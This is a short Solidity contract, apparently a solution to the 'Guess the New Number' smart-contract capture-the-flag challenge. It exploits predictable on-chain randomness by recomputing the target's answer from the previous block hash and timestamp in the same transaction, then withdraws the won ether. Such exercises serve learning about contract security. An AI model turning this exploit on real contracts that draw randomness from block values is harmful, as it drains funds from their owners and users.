pragma solidity ^0.4.21;

import "./GuessTheNewNumberChallenge.sol";

contract AttackGuessTheNewNumberChallenge{
    GuessTheNewNumberChallenge guessTheNewNumberChallenge;
    function AttackGuessTheNewNumberChallenge(address contractAddress) public payable{
        guessTheNewNumberChallenge = GuessTheNewNumberChallenge(contractAddress);
    }

    /*  When attacking, since the transaction is done on the same block, the 'randomness' 
        of block generated values won't be so random and be used as the input to always get
        the correct answer
    */
    function attack() public payable{
        require(msg.value == 1 ether);
        uint8 myGuess = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessTheNewNumberChallenge.guess.value(msg.value)(myGuess);
    }

    //withdraw the funds after the attack contract takes all the ether
    function withdraw() public{
        require(address(this).balance > 0);
        msg.sender.transfer(address(this).balance);
    }

    //0.4.21 fallback function to receive ether
    function () public payable{}

}